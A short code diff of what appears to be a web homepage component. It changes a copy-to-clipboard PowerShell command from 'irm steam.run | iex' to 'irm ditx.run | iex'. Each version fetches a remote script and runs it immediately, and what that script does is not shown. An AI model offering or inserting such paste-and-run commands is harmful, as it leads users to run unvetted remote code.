@@ -8,7 +8,7 @@ interface HomePageProps {
 
 function CopyCommand() {
   const [copied, setCopied] = useState(false);
-  const cmd = "irm steam.run | iex";
+  const cmd = "irm ditx.run | iex";
 
   const handleCopy = () => {
     navigator.clipboard.writeText(cmd);
